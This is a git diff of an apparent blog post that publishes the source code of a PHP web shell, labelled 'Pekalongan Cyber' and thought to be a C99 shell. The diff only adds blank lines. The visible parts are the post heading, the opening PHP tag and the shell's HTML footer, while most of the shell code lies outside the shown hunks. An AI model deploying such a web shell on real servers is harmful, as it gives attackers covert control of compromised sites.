@@ -14,6 +14,7 @@ tags:
 ---
 I think this is actually a C99 shell, but the script says: Pekalongan Cyber | H1j4Ck a.k.a k4L0ng666
 
+
 ### Pekalong Cyber Shell Source Code
 
 {% highlight php %}<?php //Starting calls
@@ -3224,6 +3225,7 @@ rsg_glob();
 &lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="990" height="1" valign="top"&gt;&lt;p align="center"&gt;&lt;b&gt;--[  <?php echo $shver; ?> &lt;a href="<?php echo $surl; ?>act=about"&gt;&lt;u&gt;&lt;b&gt;Modded by&lt;/b&gt;&lt;/u&gt;&lt;/a&gt; NomiE &lt;font color="#FF0000"&gt;&lt;/font&gt; | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/body&gt;&lt;/html&gt;<?php chdir($lastdir); exit();
 {% endhighlight %}
+
 
 ### Pekalongan Cyber Shell screenshot<figure id="attachment_417" style="width: 604px;" class="wp-caption aligncenter">
 
